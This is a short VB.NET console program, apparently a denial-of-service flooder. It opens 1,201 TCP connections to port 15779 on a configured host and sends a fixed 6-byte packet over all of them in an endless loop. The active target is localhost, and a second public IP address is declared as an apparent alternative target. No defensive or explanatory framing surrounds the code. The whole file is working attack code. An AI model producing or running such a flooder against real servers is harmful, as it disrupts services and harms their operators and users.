Imports System.Net, System.Net.Sockets
Module Module1

    Dim s(1200) As Socket

    Dim ip1 As String = "127.0.0.1"
    Dim ip2 As String = "78.111.78.27"

    Sub Main()
        Dim b

        Try
            For b = 0 To s.Length - 1
                s(b) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                s(b).Connect(New IPEndPoint(IPAddress.Parse(ip1), 15779))
                Console.WriteLine(b)
            Next
            b = 0

            Do While True
                For b = 0 To s.Length - 1
                    If s(b).Connected Then
                        s(b).Send(New Byte() {0, 0, &H2, &H20, 0, 0}, 6, SocketFlags.None)
                        Console.WriteLine("--" & b)
                        Threading.Thread.Sleep(1)
                    End If

                Next

            Loop

        Catch ex As Exception
            Console.Write("=========" & b)
        End Try

    End Sub

End Module
